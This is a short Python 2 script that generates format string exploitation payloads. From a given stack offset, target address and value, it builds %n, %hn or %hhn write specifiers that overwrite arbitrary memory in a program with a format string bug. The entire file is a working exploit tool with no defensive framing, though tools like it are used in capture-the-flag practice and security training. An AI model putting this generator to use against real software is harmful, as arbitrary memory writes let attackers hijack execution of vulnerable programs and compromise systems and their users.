#!/usr/bin/env python
# encoding: utf-8

import argparse
from struct import pack
        
def main():
	
	parser = argparse.ArgumentParser(description="Create payload for format string bug exploitation")
	parser.add_argument('format_number', help='offset of formater')
	parser.add_argument('addr_to_o', help='address to overwrite')
	parser.add_argument('addr_to_w', help='address to write')
	parser.add_argument('--aprint', help='number of chars already prints')
	parser.add_argument('--nformater', help='number of formater for writing (4 default - byte by byte)', default=4)
	args = parser.parse_args()
	
	args.nformater = int(args.nformater)
	if args.nformater not in [2, 4]:
	    print "Error: --nformater must be 2 or 4."
	    return
	
	# add addr_to_o on the payload
	payload = ""
	for i in range(0, 4, 4/args.nformater):
	    payload += pack('<i', int(args.addr_to_o, 16)+i)
	
	# add addr_to_w on the payload
	args.addr_to_w = int(args.addr_to_w, 16)
	
	total = len(payload)
	if args.aprint is not None:
	    total += int(args.aprint)
	
	mask = int(4/args.nformater * 'FF', 16)
	
	fmtCount = 0
	for i in range(0, 4, 4/args.nformater):
	    diff = 0
	    while ((total + diff) & mask) != args.addr_to_w & mask:
	        diff += 1
	    total += diff
	    
	    if diff != 0:
	        payload += "%{0}c%{1}${2}n".format(diff, int(args.format_number)+fmtCount, (args.nformater/2)*"h")
	    else:
	        payload += "%{0}${1}n".format(int(args.format_number)+fmtCount, (args.nformater/2)*"h")
	    
	    args.addr_to_w >>= 4/args.nformater*0x8
	    fmtCount += 1 
	    
	        
	print "Your payload : \n%s" % (repr(payload)[1:-1])
	    	    
if __name__ == '__main__':
	main()

